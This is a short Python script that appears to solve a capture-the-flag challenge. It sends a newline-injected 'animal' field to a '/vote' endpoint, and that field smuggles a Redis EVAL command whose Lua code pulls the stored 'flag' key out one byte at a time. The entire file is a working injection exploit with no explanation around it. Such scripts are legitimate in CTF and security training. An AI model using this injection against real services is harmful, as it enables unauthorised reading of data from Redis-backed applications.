import os
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

with httpx.Client(base_url=f"http://{HOST}:{PORT}") as client:
    flag = ''
    i = 1
    while not flag.endswith('}'):
        r = client.post('/vote', data={
            'animal': f'''a b\n\neval "return redis.call('GET', 'flag'):byte({i})" 0'''
        }).json()
        flag += chr(list(r.values())[0])
        print(flag)
        i += 1